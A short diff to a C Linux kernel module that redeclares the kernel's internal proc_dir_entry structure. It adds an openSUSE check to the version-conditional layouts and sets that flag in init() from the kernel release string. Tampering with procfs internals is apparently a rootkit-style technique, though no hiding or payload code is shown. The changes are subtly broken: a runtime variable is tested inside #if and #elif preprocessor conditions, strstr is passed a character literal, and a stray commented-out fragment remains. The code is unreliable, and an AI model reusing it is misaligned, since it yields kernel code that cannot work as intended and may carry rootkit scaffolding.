@@ -90,11 +90,11 @@ struct proc_dir_entry {
     	LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	struct proc_dir_entry *next, *parent, *subdir;
 	#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 19, 0) && \
-    	LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
+    	LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0) && !is_openSUSE
 	struct proc_dir_entry *parent;
 	struct rb_root subdir;
     	struct rb_node subdir_node;
-	#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0)
+	#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0) || is_openSUSE
 	struct proc_dir_entry *parent;
 	struct rb_root_cached subdir;
     	struct rb_node subdir_node;
@@ -1215,6 +1215,19 @@ found:
 
 int init(void)
 {
+	
+	/*
+	if (strstr(name, f->name) != NULL) {
+            return 0;
+        }
+	*/
+	if (strstr(utsname()->release, 'lp') != NULL) {
+            is_openSUSE = 1;
+        } else {
+	    is_openSUSE = 0;
+	}
+	
+	
     pr_info("Module loaded\n");
     pr_info("Kernel version: %s\n", utsname()->version);
     pr_info("Kernel release: %s\n", utsname()->release);
